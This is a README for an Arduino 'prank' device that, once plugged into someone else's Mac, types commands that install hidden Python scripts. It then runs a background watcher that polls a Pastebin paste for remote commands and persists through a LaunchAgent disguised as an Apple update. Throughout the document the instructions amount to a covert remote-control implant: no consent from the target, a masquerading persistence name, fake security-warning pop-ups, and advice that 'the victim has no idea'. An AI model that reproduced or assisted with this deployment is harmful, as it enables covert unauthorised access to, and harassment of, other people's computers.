# Mac Ultimate Prank — Arduino Pro Micro / Leonardo

Silently installs 12 background prank scripts the moment it's plugged in. Nothing happens immediately — you trigger pranks remotely by updating a Pastebin paste whenever you're ready.

---

## Hardware Required

- Arduino Pro Micro **or** Arduino Leonardo
- USB cable (plug into target's Mac)

---

## Setup

### 1. Create your own Pastebin

1. Go to [pastebin.com](https://pastebin.com) and create a **free account**
2. Click **New Paste**
3. Leave the content **blank** for now (or type anything that isn't a command word)
4. Set expiry to **Never** and visibility to **Public**
5. Click **Create New Paste**
6. Copy the 8-character ID from the URL — e.g. `pastebin.com/raw/XXXXXXXX` → your ID is `XXXXXXXX`

### 2. Add your Pastebin ID to the sketch

Open `sketch.ino` and find this line in the trigger section:

```
typeln("URL='https://pastebin.com/raw/XXXXXXXX'");
```

Replace `XXXXXXXX` with your actual Pastebin ID.

### 3. Flash the sketch

1. Open `sketch.ino` in the Arduino IDE
2. Set **Tools → Board** to `Arduino Leonardo` or `Arduino Pro Micro`
3. Set the correct **Port**
4. Click **Upload**

### 4. Plug into target Mac

- Plug the Arduino into the target Mac
- Wait ~15 seconds — Spotlight opens briefly, Terminal flickers, then minimises on its own
- All 12 prank scripts are now silently installed in `/tmp/`
- A hidden background watcher starts, checking your Pastebin every 5 minutes
- Remove the Arduino — the victim has no idea anything happened

> **Note:** The first run also installs `pyobjc-framework-Quartz` (needed for the mouse teleporter). This requires an internet connection and may take 20–30 seconds on slower machines.

---

## Triggering Pranks

Go to your Pastebin paste, click **Edit**, type **one of the command words** below, and save. The watcher checks every 5 minutes and launches the matching prank automatically.

| Command | What happens |
|---|---|
| `ACTIVATE` | Launches **all 12 pranks** simultaneously |
| `JIGGLE` | Mouse teleports to a random position every 60 seconds |
| `MINIMISE` | Cmd+M minimises the frontmost window every 3 minutes |
| `SOUND` | Random macOS system sound (Basso, Funk, Ping...) every 60 seconds |
| `NOTIFY` | Fake "Critical Error / Security Warning" notification every 3 minutes |
| `CLIPBOARD` | Replaces clipboard with "what did you copy", "nice try"... every 45 seconds |
| `ZOOM` | Cmd+= zooms in on everything every 90 seconds |
| `CAPS` | Caps lock toggled every 60 seconds |
| `VOLUME` | Output volume set to a random level every 60 seconds |
| `CLOSE` | Cmd+W closes the frontmost tab/window every 4 minutes |
| `SPEECH` | Mac speaks out loud: "Hi", "Message from PC", "Can you hear me"... every 2 minutes |
| `DARK` | Dark/light mode flips every 5 minutes |
| `INVERT` | Display colours inverted (Cmd+Option+Ctrl+8) every 5 minutes |
| `STOP` | Kills all pranks, removes LaunchAgent, deletes all script files |

---

## How Persistence Works

On first run, the watcher script (`/tmp/.t.py`) installs itself as a LaunchAgent at:

```
~/Library/LaunchAgents/com.apple.update.plist
```

It restarts automatically after every login until you send `STOP`.

---

## Stopping Everything

Put `STOP` in your Pastebin paste. Within 5 minutes the watcher will:
- Unload and delete the `com.apple.update` LaunchAgent
- Kill all running prank Python processes (`pkill -f`)
- Delete all 13 hidden `.py` files from `/tmp/`

---

## Requirements on Target Mac

- macOS 10.15 (Catalina) or later
- Python 3 must be installed — it ships with Xcode Command Line Tools. If not present, macOS will prompt to install it automatically when Terminal runs
- Internet connection required on first plug-in (for `pyobjc-framework-Quartz`)
- **System Events automation permission** — macOS may prompt the first time a prank tries to control the keyboard/mouse. If the target dismisses the prompt, keyboard/mouse pranks (MINIMISE, ZOOM, CAPS, CLOSE, INVERT) will silently fail but all others still work
